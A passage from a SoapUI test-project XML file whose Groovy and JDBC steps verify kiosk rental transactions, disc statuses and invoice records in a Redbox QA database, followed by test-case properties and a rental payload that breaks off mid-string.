	getTnxQuery += "Inner Join Disc d  on d.Disc_id = dt.Disc_id "
	getTnxQuery += "\n"
	getTnxQuery += "Where d.RF_ID = '$Barcode'"
	getTnxQuery += "\n"
	getTnxQuery += "Order by t.Transaction_ID desc"

	def getTnxInfo = sql.firstRow(getTnxQuery);
	def TransactionID = getTnxInfo.Transaction_ID.toString();
	def InvoiceID = getTnxInfo.InvoiceID.toString();
	log.info ("TransactionID:$TransactionID; InvoiceID:$InvoiceID");
	testRunner.testCase.setPropertyValue("TransactionID",TransactionID);
	testRunner.testCase.setPropertyValue("InvoiceID",InvoiceID);
}
else
{
	log.info ("TransactionId is generated from Auth");
}</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="b84e0374-dbe5-4322-ab23-3779e8888865"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT  
	transaction_status,
	approvalcode,
	RentalType,
	OptInTypeId,
	BillingTypeID,
	IsOffline,
	shoppingCartType
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :txnid</con:query><con:assertion type="GroovyScriptAssertion" name="Validations" id="32f2af03-b987-432f-a201-9858d49438c3"><con:configuration><scriptText>//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
def offline = context.expand( '${#TestCase#IsOffline}' );
String approve = actualAppprovalCode.toString();	
if(offline == 'true')
{
	//assert actualAppprovalCode == '&lt;APPROVALCODE/>'
	assert actualAppprovalCode == null
}
else
{	
	 assert approve.substring(0,8) == 'Approved';
}

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def CCType = context.expand( '${#TestCase#CardType}' ).toInteger();
/*
//Added if and else logic for PRM and PRG functionality and GiftCard.
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();
if ((numrentals > 0 &amp;&amp; numpurchases > 0) || CCType == 6)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}
*/</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check [RENTALTYPE]" id="41d4abab-7b86-425c-8d6c-ceeb83aaa819"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def offline = context.expand( '${#TestCase#IsOffline}' );
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def rentalType = holder.getNodeValue("//RENTALTYPE[1]");
def isOffline = holder.getNodeValue("//ISOFFLINE[1]");


assert rentalType == '3'
</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="1ed83441-2817-4b26-9b40-e57d25b3b968" name="Validations-[TransactionStatus]"><con:configuration><scriptText>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
def offline = context.expand( '${#TestCase#IsOffline}' );
def actualTransactionStatus = holder.getNodeValue("//TRANSACTION_STATUS[1]").toInteger();
String approve = actualAppprovalCode.toString();
//Rental and Purchase after vend/reconcile
def numrentals = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#VendedPurchaseCount}' ).toInteger();
//Rental and Purchase before vend/reconcile
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' );
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );

rentalVendStatusList = rentalVendStatus.split(",");
currentalVendStatus = rentalVendStatusList.take(1).toString().replace("[", "").replace("]", "");
purchaseVendStatusList = purchaseVendStatus.split(",");
curpurchaseVendStatus = purchaseVendStatusList.take(1).toString().replace("[", "").replace("]", "");

//Check TransactionStatus
if ((numrentals > 0 || numpurchases > 0) &amp;&amp; (approve.contains("Approved") || offline == 'true'))
{
	assert (actualTransactionStatus == 4);
}
else if ((numrentals > 0 || numpurchases > 0) &amp;&amp;  (!approve.contains("Approved") || offline != 'true'))
{
	assert (actualTransactionStatus == 5);
}
else
{
	if (rentalCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + currentalVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
		
	}
	else if (purchaseCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + curpurchaseVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
	}
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>txnid</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check DiscTransaction" id="27d7c1dc-126d-4289-b5c5-7263403bdd42"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	DISCTRANSACTION_STATUS
FROM
	disc_transaction (nolock)
WHERE
	transaction_id = :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" id="083f13be-1903-4cfe-971b-c5d2b61e5086" name="DiscTransaction Status"><con:configuration><scriptText><![CDATA[def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check DiscTransaction#ResponseAsXml");
def actualDiscTransactionStatus = holder.getNodeValue("//Row[1]/DISCTRANSACTION_STATUS[1]");

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )

if (vendedPurchases == "")
{
	if ((nonVendedRentals != "") && (vendedRentals == "")) 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		 
	else if ((nonVendedRentals == "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else if ((nonVendedRentals != "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		
}
else
{
	assert actualDiscTransactionStatus.toInteger() == 2
}]]></scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="e7394422-5810-4c43-b921-1dad325587fe" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="AmountBase"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");
def IsOffline = context.expand( '${#TestCase#IsOffline}' )
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
log.info ("actualAmountBase:$actualAmountBase; expectedAmountBase:$expectedAmountBase");
if (IsOffline == 'true')
{
	//assert (actualAmountBase != expectedAmountBase);
}
else
{
	assert (actualAmountBase == expectedAmountBase);
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="9acd4389-b34e-4fbb-a3a7-d0fe4c4f8a4d" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status] AS InvStatus, 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]  AS InvItemStatus
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Match content of [STATUS]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="CollectionMethod"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if (shoppingCartType == 3)
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="444868cb-53b3-4d5b-b65e-bda98e8c4f41" name="Invoice/InvoiceItem Status"><con:configuration><scriptText>//Validate Invoice and InvoiceItem status.
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def AmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
def IsOffline = context.expand( '${#TestCase#IsOffline}' );
def RentalCount = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
log.info ("AmountBase:$AmountBase; actualInvoiceStatus:$actualInvoiceStatus; actualInvoiceItemStatus:$actualInvoiceItemStatus");
//log.info ("CardType:$CardType; IsOffline:$IsOffline");
//Online Case
if (IsOffline == 'false')
{
   if (AmountBase == 0.00)
   {
   		assert (actualInvoiceStatus == 1);
          assert (actualInvoiceItemStatus == 17);
   }
   else if (AmountBase > 0.00)
   {
       if (PurchaseCount > 0)
       {
           assert (actualInvoiceStatus == 1);
           assert (actualInvoiceItemStatus == 3);
       }
       else
       {
           assert (actualInvoiceStatus == 1);
           assert (actualInvoiceItemStatus == 17);
       }
   }
}
//Offline Case
else
{
    if (AmountBase == 0.00)
    {
        if (RentalCount > 0 || PurchaseCount > 0)
        {
            assert (actualInvoiceStatus == 1);
            assert (actualInvoiceItemStatus == 16);
        }
        else
        {
            assert (actualInvoiceStatus == 4);
            assert (actualInvoiceItemStatus == 15);
        }
        
    }
    else if (AmountBase > 0.00)
    {
        assert (actualInvoiceStatus == 1);
        assert (actualInvoiceItemStatus == 6)
    }
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="27e1500e-9d5d-4d87-aecf-4c92701d51e9"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	Physical_Status 
FROM 
	Disc as d
inner join 
	Disc_Transaction as dt
on 
	d.Disc_ID=dt.Disc_ID
where
	 dt.Transaction_ID= :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" name="Assert node [Row]" id="39f9cf12-b464-42a1-82ef-b8f46f0da842"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder
import java.util.*

def gv = new com.eviware.soapui.support.GroovyUtils(context);
def rawXML = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]}' )
def holder = gv.getXmlHolder(rawXML)
def nodecount = holder["count(//Results[1]/ResultSet[1]/Row)"]
def physicalstatusArray = [5] ;

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )
log.info ("vendedRentals:$vendedRentals; vendedPurchases:$vendedPurchases");

for (i = 1; i &lt;= nodecount.toInteger(); i++)
{
    def responseAsXml = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row['+i+']/PHYSICAL_STATUS[1]}' );
    physicalstatusArray[i-1] = responseAsXml.toInteger();
    //log.info('physicalstatusArray : ' + physicalstatusArray)
}
    if(vendedPurchases != "")
    {
        //log.info("only purchase")
        assert physicalstatusArray.contains(8)
        
    }
    else if(vendedRentals != "")
    {
        //log.info("only Rental")
        assert physicalstatusArray.contains(3)
    }
    else 
    {
        def transactionStatus = context.expand( '${Check Transaction#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]}' );
        if (transactionStatus == '11')
        {
            assert physicalstatusArray.contains(9)
        }
        else
        {
            assert physicalstatusArray.contains(2)
        }        
    }</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Message Control" id="4940ff22-e3fe-4224-9d22-bce790f51976"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	ProcessFlag
FROM 
	MessageControl(nolock)
WHERE
	MessageId = :GUID</con:query><con:assertion type="Simple Contains" name="Contains" id="4e246be7-4cee-4b19-9b66-d23e79c330d8"><con:configuration><token>&lt;PROCESSFLAG>2&lt;/PROCESSFLAG></token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>GUID</con:name><con:value>${#TestCase#ReconcileGUID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="ModResvPickup Completed" id="92d42441-6b52-4a2c-bec7-0a754fc29891"><con:settings/><con:config><script>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Update Physical Status = 2 for Digital Codes.
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505 and Title_ID in (Select Title_ID from Title Where FormatId = 17)")</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983003</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058110</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.loyalty@gmail.com</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>null</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>0.00</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>RentalVendStatus</con:name><con:value>Vended,Vended,Vended,NotVended</con:value></con:property><con:property><con:name>PurchaseVendStatus</con:name><con:value/></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>4</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>001505074,001505075,001505076,000150501</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Games,Games,Games,Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>PS4,PS4,PS4,DVD</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>3.00,0,0,1.75</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>66.00,0,0,28.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>22,22,22,16</con:value></con:property><con:property><con:name>VendedRentalBarcodes</con:name><con:value>001505074,001505075,001505076</con:value></con:property><con:property><con:name>nonvendedRentalBarcodes</con:name><con:value>000150501</con:value></con:property><con:property><con:name>VendedRentalsCount</con:name><con:value>3</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : 1,  "Items" : [{"ProductId" : 10580,"Barcode" : "001505074","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 1,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00},"BlurayUpsell" : null,"SourceType" : 0},{"ProductId" : 10581,"Barcode" : "001505075","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 2,"Pricing" : {"InitialNight" : 0,"ExtraNight" : 0,"NonReturn" : 0,"Expiration" : 0,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 0,"DefaultExtraNight" : 0},"BlurayUpsell" : null,"SourceType" : 0},{"ProductId" : 10582,"Barcode" : "001505076","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 3,"Pricing" : {"InitialNight" : 0,"ExtraNight" : 0,"NonReturn" : 0,"Expiration" : 0,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 0,"DefaultExtraNight" : 0},"BlurayUpsell" : null,"SourceType" : 0},{"ProductId" : 986,"Barcode" : "000150501","VendStatus" : "NotVended","ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"DiscNumber" : null,"Pricing" : {"InitialNight" : 1.75,"ExtraNight" : 1.75,"NonReturn" : 28.00,"Expiration" : 1.75,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 1.75,"DefaultExtraNight" : 1.75},"BlurayUpsell" : null,"SourceType" : 0}], "Totals" : { "TaxRate" : 9.7500, "Subtotal" : 3, "DiscountedSubtotal" : 3, "TaxAmount" : "0.2925", "GrandTotal" : 3.2925 } }</con:value></con:property><con:property><con:name>VendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>NonVendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>VendedPurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>digitalpurchaseTaxAmt</con:name><con:value/></con:property><con:property><con:name>purchasePayload</con:name><con:value/></con:property><con:property><con:name>IsOffline</con:name><con:value/></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22ModResvPickup%22%2C%22MessageId%22%3A+%22519b8284-ef91-4d7a-aa49-f18207937712%22%2C%22EngineVersion%22%3A+%221.31.0.17%22%2C%22BundleVersion%22%3A+%222.31.0.6%22%2C%22Email%22%3A+%22rental.loyalty%40gmail.com%22%2C%22KioskId%22%3A+1505%2C%22ReferenceNumber%22%3A+5648637%2C%22Items%22%3A+%7B+%7D%2C%22PickupDate%22%3A+%7B%22theDate%22%3A+636814527693110000%2C%22dateTimeKind%22%3A+%22Local%22%2C%22dateString%22%3A+%222018-12-26T14%3A26%3A09.0000311%22%7D%2C%22ModifiedCart%22%3A+false%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+10580%2C%22Barcode%22+%3A+%22001505074%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+1%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+10581%2C%22Barcode%22+%3A+%22001505075%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+2%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+0%2C%22ExtraNight%22+%3A+0%2C%22NonReturn%22+%3A+0%2C%22Expiration%22+%3A+0%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+0%2C%22DefaultExtraNight%22+%3A+0%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+10582%2C%22Barcode%22+%3A+%22001505076%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+3%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+0%2C%22ExtraNight%22+%3A+0%2C%22NonReturn%22+%3A+0%2C%22Expiration%22+%3A+0%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+0%2C%22DefaultExtraNight%22+%3A+0%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+986%2C%22Barcode%22+%3A+%22000150501%22%2C%22VendStatus%22+%3A+%22NotVended%22%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%5D%2C+%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C+%22Subtotal%22+%3A+3%2C+%22DiscountedSubtotal%22+%3A+3%2C+%22TaxAm